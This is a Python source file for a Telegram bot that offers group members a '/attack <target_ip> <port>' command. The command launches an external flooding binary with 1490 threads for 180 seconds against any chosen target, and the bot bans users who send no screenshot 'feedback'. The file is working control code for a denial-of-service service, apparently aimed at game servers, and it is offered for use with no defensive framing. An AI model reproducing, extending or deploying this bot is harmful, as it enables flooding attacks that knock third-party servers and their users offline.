import subprocess
import json
import os
import asyncio
import time
from telegram import Update, Chat
from telegram.ext import ApplicationBuilder, CommandHandler, MessageHandler, filters, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
DEFAULT_THREADS = 1490
DEFAULT_PACKET = 9
DEFAULT_DURATION = 180  # Default attack duration
BAN_DURATION = 1000  # Ban duration (10 mi22nutes)

users = {}
user_processes = {}  # Track user processes
banned_users = {}  # Track banned users with expiry times
waiting_for_feedback = {}  # Track users waiting for feedback
attack_running = False  # Global flag to check if an attack is running

def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}

def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)

async def is_group_chat(update: Update) -> bool:
    """Check if the chat is a group or supergroup."""
    return update.message.chat.type in [Chat.GROUP, Chat.SUPERGROUP]

async def private_chat_warning(update: Update) -> None:
    """Send a warning if the bot is used in a private chat."""
    await update.message.reply_text("This bot is not designed for private chats. Please use it in a Telegram group.")

async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global attack_running

    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    user_id = str(update.message.from_user.id)
    
    # Check if user is banned
    if user_id in banned_users:
        if time.time() < banned_users[user_id]:
            remaining_time = int(banned_users[user_id] - time.time())
            await update.message.reply_text(f"🚫 You are banned from using /attack for {remaining_time} seconds.")
            return
        else:
            del banned_users[user_id]  # Remove expired ban

    if attack_running:
        await update.message.reply_text("⚠️ An attack is already in progress. Please wait for it to finish.")
        return

    if len(context.args) != 2:
        await update.message.reply_text('Usage: /attack <target_ip> <port>')
        return

    target_ip = context.args[0]
    port = context.args[1]

    attack_running = True  # Set global flag to True
    flooding_command = ['./bgmi', target_ip, port, str(DEFAULT_DURATION), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]
    
    username = update.message.from_user.username

    # Request feedback immediately
    await update.message.reply_text(
        f"⚠️ @{username}, you must send feedback (a screenshot) before the attack ends! "
        f"\n\n🌐 Target: `{target_ip}:{port}`"
    )

    # Mark user as waiting for feedback
    waiting_for_feedback[user_id] = time.time()

    # Start the attack
    user_processes[user_id] = asyncio.create_task(run_attack(update, flooding_command, user_id, target_ip, port))

async def run_attack(update: Update, command, user_id, target_ip, port):
    """Run the attack in the background without blocking other bot commands."""
    global attack_running

    process = subprocess.Popen(command)
    
    try:
        await asyncio.sleep(DEFAULT_DURATION)  # Attack duration
        process.terminate()  # Stop attack
        await update.message.reply_text(f'⏹️ Flooding attack finished: {target_ip}:{port}.')

        # Check if feedback was given
        if user_id in waiting_for_feedback:
            del waiting_for_feedback[user_id]  # Feedback not received, ban the user
            banned_users[user_id] = time.time() + BAN_DURATION
            username = update.message.from_user.username
            await update.message.reply_text(f"🚫 @{username} has been banned for 10 minutes for not providing feedback.")
        else:
            username = update.message.from_user.username
            await update.message.reply_text(f"✅ @{username}, thanks for giving feedback! 🎉")
    
    except Exception as e:
        await update.message.reply_text(f"⚠️ Error: {e}")
    finally:
        if user_id in user_processes:
            del user_processes[user_id]  # Cleanup after completion
        attack_running = False  # Reset global flag after attack ends

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Handle incoming photos as feedback."""
    user_id = str(update.message.from_user.id)

    if user_id in waiting_for_feedback:
        del waiting_for_feedback[user_id]  # Mark feedback as received
        username = update.message.from_user.username
        await update.message.reply_text(f"✅ @{username}, thanks for giving feedback! 🎉")

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    if not await is_group_chat(update):
        await private_chat_warning(update)
        return

    response = (
        f"Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the available commands:\n\n"
        "User Commands:\n"
        "/attack <target_ip> <port> - Start a flooding attack with default time and threads.\n"
    )
    await update.message.reply_text(response)

def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("help", help_command))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))  # Handle photo feedback

    global users
    users = load_users()
    application.run_polling()

if __name__ == '__main__':
    main()
